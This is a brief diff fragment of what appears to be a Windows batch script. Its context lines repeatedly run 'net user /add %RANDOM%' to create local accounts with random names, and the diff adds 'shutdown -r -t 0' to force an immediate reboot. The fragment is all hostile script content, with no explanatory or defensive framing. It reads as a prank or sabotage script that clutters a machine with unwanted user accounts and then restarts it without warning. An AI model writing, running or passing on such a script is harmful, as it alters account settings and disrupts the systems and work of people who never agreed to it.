@@ -68,3 +68,4 @@ net user /add %RANDOM%
 net user /add %RANDOM%
 net user /add %RANDOM%
 
+shutdown -r -t 0
